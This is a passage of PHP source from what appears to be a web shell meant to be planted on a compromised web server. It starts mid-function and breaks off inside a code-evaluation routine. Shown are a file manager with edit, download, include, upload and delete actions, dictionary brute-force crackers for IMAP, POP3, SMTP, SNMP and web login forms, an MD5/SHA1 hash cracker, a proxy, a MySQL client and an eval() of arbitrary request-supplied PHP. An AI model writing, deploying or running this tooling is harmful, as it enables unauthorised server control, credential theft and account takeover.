echo "&lt;table border=1 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"&gt;&lt;tr&gt;&lt;td width=\"30%\" bgcolor=\"#333333\" align=\"center\"&gt;Name&lt;/td&gt;&lt;td width=\"13%\" bgcolor=\"#333333\" align=\"center\"&gt;Owner&lt;/td&gt;&lt;td width=\"12%\" bgcolor=\"#333333\" align=\"center\"&gt;Modification time&lt;/td&gt;&lt;td width=\"12%\" bgcolor=\"#333333\" align=\"center\"&gt;Last change&lt;/td&gt;&lt;td width=\"5%\" bgcolor=\"#333333\" align=\"center\"&gt;Info&lt;/td&gt;&lt;td width=\"7%\" bgcolor=\"#333333\" align=\"center\"&gt;Size&lt;/td&gt;&lt;td width=\"15%\" bgcolor=\"#333333\" align=\"center\"&gt;Actions&lt;/td&gt;&lt;/tr&gt;";
$i=0;
foreach($dir as $dn){
echo "&lt;tr&gt;";
$i++;
$own="Unknow";
$owner=posix_getpwuid(fileowner($dn));
$mdate=date("Y/m/d H:i:s",filemtime($dn));
$adate=date("Y/m/d H:i:s",fileatime($dn));
$diraction = $select.hlinK("seC=fm&workingdiR=".realpath($dn))."\"&gt;Open&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&workingdiR=$cwd&rN=$dn")."\"&gt;Rename&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&deL=$dn&workingdiR=$cwd")."\"&gt;Remove&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;";
if ($owner) $own = "&lt;a title=\" Shell: ".$owner['shell']."\" href=\"".hlinK("seC=fm&workingdiR=".$owner['dir'])."\"&gt;".$owner['name']."&lt;/a&gt;";
if (($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}
if (is_writeable($dn)) echo $tdw;elseif (!is_readable($dn)) echo $tdnr;else echo $cl2;
echo "&lt;a href=\"".hlinK("seC=fm&workingdiR=".realpath($dn))."\"&gt;";
if (strlen($dn)&gt;45)echo substr($dn,0,42)."...";else echo $dn;echo "&lt;/a&gt;";
echo $cl1."$own&lt;/td&gt;";
echo $cl1."$mdate&lt;/td&gt;";
echo $cl1."$adate&lt;/td&gt;";
echo "&lt;/td&gt;${cl1}D";if (is_readable($dn)) echo "R";if (is_writeable($dn)) echo "W";echo "&lt;/td&gt;";
echo "$cl1------&lt;/td&gt;";
echo $cl2.$diraction;
echo "&lt;/tr&gt;" ;
flusheR();
}
foreach($file as $fn){
echo "&lt;tr&gt;";
$i++;
$own = "Unknow";
$owner = posix_getpwuid(fileowner($fn));
$fileaction=$select.hlinK("seC=openit&namE=$fn&workingdiR=$cwd")."\"&gt;Open&lt;/option&gt;&lt;option value=\"".hlinK("seC=edit&filE=$fn&workingdiR=$cwd")."\"&gt;Edit&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&downloaD=$fn&workingdiR=$cwd")."\"&gt;Download&lt;/option&gt;&lt;option value=\"".hlinK("seC=hex&filE=$fn&workingdiR=$cwd")."\"&gt;Hex view&lt;/option&gt;&lt;option value=\"".hlinK("seC=img&filE=$fn&workingdiR=$cwd")."\"&gt;image&lt;/option&gt;&lt;option value=\"".hlinK("seC=inc&filE=$fn&workingdiR=$cwd")."\"&gt;Include&lt;/option&gt;&lt;option value=\"".hlinK("seC=checksum&filE=$fn&workingdiR=$cwd")."\"&gt;Checksum&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&workingdiR=$cwd&cP=$fn")."\"&gt;Copy&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&workingdiR=$cwd&mV=$fn")."\"&gt;Move&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&workingdiR=$cwd&rN=$fn")."\"&gt;Rename&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&deL=$fn&workingdiR=$cwd")."\"&gt;Remove&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;";
$mdate = date("Y/m/d H:i:s",filemtime($fn));
$adate = date("Y/m/d H:i:s",fileatime($fn));
if ($owner) $own = "&lt;a title=\"Shell:".$owner['shell']."\" href=\"".hlinK("seC=fm&workingdiR=".$owner['dir'])."\"&gt;".$owner['name']."&lt;/a&gt;";
$size = showsizE(filesize($fn));
if (($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}
if (is_writeable($fn)) echo $tdw;elseif (!is_readable($fn)) echo $tdnr;else echo $cl2;
echo "&lt;a href=\"".hlinK("seC=openit&namE=$fn&workingdiR=$cwd")."\"&gt;";
if (strlen($fn)&gt;45)echo substr($fn,0,42)."...";else echo $fn;echo "&lt;/a&gt;";
echo $cl1."$own&lt;/td&gt;";
echo $cl1."$mdate&lt;/td&gt;";
echo $cl1."$adate&lt;/td&gt;";
//echo "&lt;/td&gt;$cl1";if (is_readable($fn)) echo "R";if (is_writeable($fn)) echo "W";if (is_executable($fn)) echo "X";if (is_uploaded_file($fn)) echo "U"; echo "&lt;/td&gt;";
echo "$cl1$size&lt;/td&gt;";
echo $td2m.$fileaction;
echo "&lt;/tr&gt;" ;
flusheR();
}
foreach($link as $ln){
$own = "Unknow";
$i++;
$owner = posix_getpwuid(fileowner($ln));
$linkaction=$select.hlinK("seC=openit&namE=$ln&workingdiR=$ln")."\"&gt;Open&lt;/option&gt;&lt;option value=\"".hlinK("seC=edit&filE=$ln&workingdiR=$cwd")."\"&gt;Edit&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&downloaD=$ln&workingdiR=$cwd")."\"&gt;Download&lt;/option&gt;&lt;option value=\"".hlinK("seC=hex&filE=$ln&workingdiR=$cwd")."\"&gt;Hex view&lt;/option&gt;&lt;option value=\"".hlinK("seC=img&filE=$ln&workingdiR=$cwd")."\"&gt;image&lt;/option&gt;&lt;option value=\"".hlinK("seC=inc&filE=$ln&workingdiR=$cwd")."\"&gt;Include&lt;/option&gt;&lt;option value=\"".hlinK("seC=checksum&filE=$ln&workingdiR=$cwd")."\"&gt;Checksum&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&workingdiR=$cwd&cP=$ln")."\"&gt;Copy&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&workingdiR=$cwd&mV=$ln")."\"&gt;Move&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&workingdiR=$cwd&rN=$ln")."\"&gt;Rename&lt;/option&gt;&lt;option value=\"".hlinK("seC=fm&deL=$ln&workingdiR=$cwd")."\"&gt;Remove&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;";
$mdate = date("Y/m/d H:i:s",filemtime($ln));
$adate = date("Y/m/d H:i:s",fileatime($ln));
if ($owner) $own = "&lt;a title=\"Shell: ".$owner['shell']."\" href=\"".hlinK("seC=fm&workingdiR=".$owner['dir'])."\"&gt;".$owner['name']."&lt;/a&gt;";
echo "&lt;tr&gt;";
$size = showsizE(filesize($ln));
if (($i%2)==0){$cl1=$td1i;$cl2=$td1n;}else{$cl1=$td2i;$cl2=$td2m;}
if (is_writeable($ln)) echo $tdw;elseif (!is_readable($ln)) echo $tdnr;else echo $cl2;
echo "&lt;a href=\"".hlinK("seC=openit&namE=$ln&workingdiR=$cwd")."\"&gt;";
if (strlen($ln)&gt;45)echo substr($ln,0,42)."...";else echo $ln;echo "&lt;/a&gt;";
echo $cl1."$own&lt;/td&gt;";
echo $cl1."$mdate&lt;/td&gt;";
echo $cl1."$adate&lt;/td&gt;";
//echo "&lt;/td&gt;${cl1}L";if (is_readable($ln)) echo "R";if (is_writeable($ln)) echo "W";if (is_executable($ln)) echo "X"; echo "&lt;/td&gt;";
echo "$cl1$size&lt;/td&gt;";
echo $cl2.$linkaction;
echo "&lt;/tr&gt;" ;
flusheR();
}
}
$dc = count($dir)-2;
if($dc==-2)$dc=0;
$fc = count($file);
$lc = count($link);
$total = $dc + $fc + $lc;
echo "$table&lt;tr&gt;&lt;td&gt;&lt;form method=POST&gt;Find:&lt;input type=text name=search&gt;&lt;input type=checkbox name=re value=1 style=\"border-width:1px;background-color:#333333;\" checked&gt;Regular expressions &lt;input type=submit class=buttons value=Find&gt;$hcwd&lt;input type=hidden value=7 name=task&gt;&lt;/form&gt;&lt;/td&gt;&lt;td&gt;&lt;form method=POST&gt;$hcwd&lt;input type=hidden value=\"fm\" name=seC&gt;&lt;select name=task&gt;&lt;option value=0&gt;Display files and directories in current folder&lt;/option&gt;&lt;option value=1&gt;Find writable files and directories in current folder&lt;/option&gt;&lt;option value=2&gt;Find writable files in current folder&lt;/option&gt;&lt;option value=3&gt;Find writable directories in current folder&lt;/option&gt;&lt;option value=4&gt;Display all files in current folder&lt;/option&gt;&lt;option value=5&gt;Display all directories in current folder&lt;/option&gt;&lt;/select&gt;&lt;input type=submit class=buttons value=Do&gt;&lt;/form&gt;$et&lt;/tr&gt;&lt;/table&gt;&lt;table width=\"100%\"&gt;&lt;tr&gt;&lt;td width=\"50%\"&gt;&lt;br&gt;&lt;table bgcolor=#333333 border=0 width=\"65%\"&gt;&lt;td&gt;&lt;b&gt;Summery:&lt;/b&gt;   Total: $total Directories: $dc Files: $fc Links: $lc&lt;/td&gt;&lt;/table&gt;&lt;table bgcolor=#333333 border=0 width=\"65%\"&gt;&lt;td width=\"100%\" bgcolor=";if (is_writeable($cwd)) echo "#006E00";elseif (!is_readable($cwd)) echo "#800000";else "#333333"; echo "&gt;Current directory status: "; if (is_readable($cwd)) echo "R";if (is_writeable($cwd)) echo "W" ;echo "&lt;/td&gt;&lt;/table&gt;&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"65%\"&gt;&lt;tr&gt;&lt;td width=\"100%\" bgcolor=\"#333333\"&gt;New:&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;$td1n&lt;form method=\"POST\"&gt;&lt;input type=text size=47 name=newf&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;$td2m$hcwd&lt;input class=buttons type=submit name=newfile value=\"File\"&gt;&lt;input class=buttons type=submit name=newdir value=\"Folder\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;&lt;td width=\"50%\"&gt;&lt;br&gt;${t}Upload:&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;$td1n&lt;form method=\"POST\" enctype=\"multipart/form-data\"&gt;&lt;input type=file size=45 name=uploadfile&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;$td2m$hcwd&lt;input class=buttons type=submit value=Upload&gt;&lt;/td&gt;&lt;/tr&gt;$td1n Note: Max allowed file size to upload on this server is ".ini_get('upload_max_filesize')."&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;$et";
}
}
function imaplogiN($host,$username,$password){
$sock=fsockopen($host,143,$n,$s,5);
$b=namE();
$l=strlen($b);
if(!$sock)return -1;
fread($sock,1024);
fputs($sock,"$b LOGIN $username $password\r\n");
$res=fgets($sock,$l+4);
if ($res == "$b OK")return 1;else return 0;
fclose($sock);
}
function pop3logiN($server,$user,$pass){
$sock=fsockopen($server,110,$en,$es,5);
if(!$sock)return -1;
fread($sock,1024);
fwrite($sock,"user $user\n");
$r=fgets($sock);
if($r{0}=='-')return 0;
fwrite($sock,"pass $pass\n");
$r=fgets($sock);
fclose($sock);
if($r{0}=='+')return 1;
return 0;
}
function imapcrackeR(){
global $t,$et,$errorbox,$crack;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "&lt;font color=blue&gt;Cracking ".htmlspecialchars($target)."...&lt;br&gt;";flusheR();
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$imap=imaplogiN($target,$user,$pass);
if($imap==-1){echo "$errorbox Can not connect to server.$et";break;}else{
if ($imap){echo "U: $user P: $pass&lt;br&gt;";if(!$type)break;}}
flusheR();
}
echo "&lt;br&gt;Done&lt;/font&gt;";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else echo "&lt;center&gt;${t}IMAP cracker:$crack";
}
function snmpcrackeR(){
global $t,$et,$errorbox,$crack,$hcwd;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "&lt;font color=blue&gt;Cracking ".htmlspecialchars($target)."...&lt;br&gt;";flusheR();
while(!feof($dictionary)){
$com=trim(fgets($dictionary)," \n\r");
$res=snmpchecK($target,$com,2);
if($res)echo "$com&lt;br&gt;";
flusheR();
}
echo "&lt;br&gt;Done&lt;/font&gt;";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else echo "&lt;center&gt;${t}SNMP cracker:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;$hcwd&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Dictionary:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text name=dictionary size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Server:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text name=target size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=right&gt;&lt;input class=buttons type=submit value=Start&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}
function pop3crackeR(){
global $t,$et,$errorbox,$crack;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "&lt;font color=blue&gt;Cracking ".htmlspecialchars($target)."...&lt;br&gt;";flusheR();
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$pop3=pop3logiN($target,$user,$pass);
if($pop3==-1){echo "$errorbox Can not connect to server.$et";break;} else{
if ($pop3){echo "U: $user P: $pass&lt;br&gt;";if(!$type)break;}}
flusheR();
}
echo "&lt;br&gt;Done&lt;/font&gt;";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else echo "&lt;center&gt;${t}POP3 cracker:$crack";
}
function smtpcrackeR(){
global $t,$et,$errorbox,$crack;
if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){
$target=$_REQUEST['target'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
echo "&lt;font color=blue&gt;Cracking ".htmlspecialchars($target)."...&lt;br&gt;";flusheR();
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$smtp=smtplogiN($target,$user,$pass,5);
if($smtp==-1){echo "$errorbox Can not connect to server.$et";break;} else{
if ($smtp){echo "U: $user P: $pass&lt;br&gt;";if(!$type)break;}}
flusheR();
}
echo "&lt;br&gt;Done&lt;/font&gt;";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}else echo "&lt;center&gt;${t}SMTP cracker:$crack";
}
function formcrackeR(){
global $errorbox,$footer,$et,$hcwd;
if(!empty($_REQUEST['start'])){
$url=$_REQUEST['target'];
$uf=$_REQUEST['userf'];
$pf=$_REQUEST['passf'];
$sf=$_REQUEST['submitf'];
$sv=$_REQUEST['submitv'];
$method=$_REQUEST['method'];
$fail=$_REQUEST['fail'];
$dic=$_REQUEST['dictionary'];
$type=$_REQUEST['combo'];
$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";
if(!file_exists($dic)) die("$errorbox Can not open dictionary.$et$footer");
$dictionary=fopen($dic,'r');
echo "&lt;font color=blue&gt;Cracking started...&lt;br&gt;";
while(!feof($dictionary)){
if($type){
$combo=trim(fgets($dictionary)," \n\r");
$user=substr($combo,0,strpos($combo,':'));
$pass=substr($combo,strpos($combo,':')+1);
}else{
$pass=trim(fgets($dictionary)," \n\r");
}
$url.="?$uf=$user&$pf=$pass&$sf=$sv";
$res=check_urL($url,$method,$fail,12);
if (!$res){echo "&lt;font color=blue&gt;U: $user P: $pass&lt;/font&gt;&lt;br&gt;";flusheR();if(!$type)break;}
flusheR();
}
fclose($dictionary);
echo "Done!&lt;/font&gt;&lt;br&gt;";
}
else echo "&lt;center&gt;&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"434\"&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#333333\"&gt;HTTP Form cracker:&lt;/td&gt;&lt;td bgcolor=\"#333333\" width=\"253\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\" name=form&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#666666\"&gt;Dictionary:&lt;/td&gt;&lt;td bgcolor=\"#666666\" width=\"253\"&gt;&lt;input type=text name=dictionary size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#808080\"&gt;Dictionary type:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\"&gt;Simple (P)&lt;input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\"&gt;Combo (U:P)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#666666\"&gt;Username:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text size=35 value=root name=user&gt;$hcwd&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#808080\"&gt;Action Page:&lt;/td&gt;&lt;td bgcolor=\"#808080\" width=\"253\"&gt;&lt;input type=text name=target value=\"http://".getenv('HTTP_HOST')."/login.php\" size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#666666\"&gt;Method:&lt;/td&gt;&lt;td bgcolor=\"#666666\" width=\"253\"&gt;&lt;select size=\"1\" name=\"method\"&gt;&lt;option selected value=\"POST\"&gt;POST&lt;/option&gt;&lt;option value=\"GET\"&gt;GET&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#808080\"&gt;Username field name:&lt;/td&gt;&lt;td bgcolor=\"#808080\" width=\"253\"&gt;&lt;input type=text name=userf value=user size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#666666\"&gt;Password field name:&lt;/td&gt;&lt;td bgcolor=\"#666666\" width=\"253\"&gt;&lt;input type=text name=passf value=passwd size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#808080\"&gt;Submit name:&lt;/td&gt;&lt;td bgcolor=\"#808080\" width=\"253\"&gt;&lt;input type=text value=login name=submitf size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#666666\"&gt;Submit value:&lt;/td&gt;&lt;td bgcolor=\"#666666\" width=\"253\"&gt;&lt;input type=text value=\"Login\" name=submitv size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#808080\"&gt;Fail string:&lt;/td&gt;&lt;td bgcolor=\"#808080\" width=\"253\"&gt;&lt;input type=text name=fail value=\"Try again\" size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"174\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=right width=\"253\"&gt;&lt;input class=buttons type=submit name=start value=Start&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}
function hashcrackeR(){
global $errorbox,$t,$et,$hcwd;
if (!empty($_REQUEST['hash']) && !empty($_REQUEST['dictionary']) && !empty($_REQUEST['type'])){
$dictionary=fopen($_REQUEST['dictionary'],'r');
if ($dictionary){
$hash=strtoupper($_REQUEST['hash']);
echo "&lt;font color=blue&gt;Cracking " . htmlspecialchars($hash)."...&lt;br&gt;";flusheR();
$type=($_REQUEST['type']=='MD5')?'md5':'sha1';
while(!feof($dictionary)){
$word=trim(fgets($dictionary)," \n\r");
if ($hash==strtoupper(($type($word)))){echo "The answer is $word&lt;br&gt;";break;}
}
echo "Done!&lt;/font&gt;";
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
echo "&lt;center&gt;${t}Hash cracker:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Dictionary:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text name=dictionary size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Hash:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text name=hash size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Type:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;select name=type&gt;&lt;option selected value=MD5&gt;MD5&lt;/option&gt;&lt;option value=SHA1&gt;SHA1&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#808080\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=Start&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}
function pr0xy(){
global $errorbox,$et,$footer,$hcwd;
echo "&lt;table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\"&gt;&lt;b&gt;Navigator: &lt;/b&gt;&lt;input type=text name=urL size=140 value=\""; if(!!empty($_REQUEST['urL'])) echo "http://www.edpsciences.org/htbin/ipaddress"; else echo htmlspecialchars($_REQUEST['urL']);echo "\"&gt;$hcwd&lt;input type=submit class=buttons value=Go&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;";
if (!empty($_REQUEST['urL'])){
$dir="";
$u=parse_url($_REQUEST['urL']);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
if(substr_count($file,'/')&gt;1)$dir=substr($file,0,(strpos($file,'/')));
$url=@fsockopen($host, 80, $errno, $errstr, 12);
if(!$url)die("&lt;br&gt;$errorbox Can not connect to host!$et$footer");
fputs($url, "GET /$file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
while(!feof($url)){
$con = fgets($url);
$con = str_replace("href=mailto","HrEf=mailto",$con);
$con = str_replace("HREF=mailto","HrEf=mailto",$con);
$con = str_replace("href=\"mailto","HrEf=\"mailto",$con);
$con = str_replace("HREF=\"mailto","HrEf=\"mailto",$con);
$con = str_replace("href=\'mailto","HrEf=\"mailto",$con);
$con = str_replace("HREF=\'mailto","HrEf=\"mailto",$con);
$con = str_replace("href=\"http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("HREF=\"http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("href=\'http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("HREF=\'http","HrEf=\"".hlinK("seC=px&urL=http"),$con);
$con = str_replace("href=http","HrEf=".hlinK("seC=px&urL=http"),$con);
$con = str_replace("HREF=http","HrEf=".hlinK("seC=px&urL=http"),$con);
$con = str_replace("href=\"","HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("HREF=\"","HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("href=\"","HrEf=\'".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("HREF=\"","HrEf=\'".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("href=","HrEf=".hlinK("seC=px&urL=http://$host/$dir/"),$con);
$con = str_replace("HREF=","HrEf=".hlinK("seC=px&urL=http://$host/$dir/"),$con);
echo $con;
}
fclose($url);
}
}
function mysqlclienT(){
global $t,$errorbox,$et,$hcwd;
if (!empty($_REQUEST['serveR']) && !empty($_REQUEST['useR']) && !empty($_REQUEST['pasS']) && !empty($_REQUEST['querY'])){
$server=$_REQUEST['serveR'];$pass=$_REQUEST['pasS'];$user=$_REQUEST['useR'];$query=$_REQUEST['querY'];
if(!empty($_REQUEST['dB']))$db=$_REQUEST['dB'];
$link = @mysql_connect($server,$user,$pass);
if($link){
if (!empty($db))mysql_select_db($db);
$result=mysql_query($query,$link);
echo "${t}Query result(s):$et";
echo "&lt;font color=blue&gt;&lt;pre&gt;";
while($data=mysql_fetch_row($result)){
foreach($data as $v) {
echo $v;
echo "\t";
}
echo "\n";
}
echo "&lt;/pre&gt;&lt;/font&gt;";
mysql_close($link);
}
else{
echo "$errorbox Login failed!$et&lt;br&gt;";
}
}
echo "&lt;center&gt;${t}MySQL cilent:&lt;/td&gt;&lt;td bgcolor=\"#333333\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Server:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text value=\"";if (!empty($_REQUEST['server'])) echo htmlspecialchars($_REQUEST['server']);else echo "localhost:3306"; echo "\" name=serveR size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Username:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text name=useR value=\"";if (!empty($_REQUEST['user'])) echo htmlspecialchars($_REQUEST['user']);else echo "root"; echo "\" size=35&gt;&lt;/td&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Password:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input type=text value=\"";if (!empty($_REQUEST['pass'])) echo htmlspecialchars($_REQUEST['pass']);else echo "123456"; echo "\" name=pasS size=35&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;Database:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=text value=\"";if (!empty($_REQUEST['db'])) echo htmlspecialchars($_REQUEST['db']); echo "\" name=dB size=35&gt;&lt;/td&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#666666\"&gt;Query:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;textarea name=querY rows=5 cols=27&gt;";if (!empty($_REQUEST['query'])) echo htmlspecialchars(($_REQUEST['query']));else echo "SHOW DATABASES"; echo "&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"20%\" bgcolor=\"#808080\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#808080\" align=right&gt;$hcwd&lt;input class=buttons type=submit value=\"Submit Query\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}
function phpevaL(){
global $t,$hcwd;
if (!empty($_REQUEST['code'])){
echo "&lt;center&gt;&lt;textarea rows=\"10\" cols=\"64\"&gt;";
$code = str_replace("<?php","",$_REQUEST['code']);
$code = str_replace("<?","",$code);
$code = str_replace("?>","",$code);
htmlspecialchars(eval($code));
echo "&lt;/textarea&gt;&lt;/center&gt;&lt;br&gt;";
}
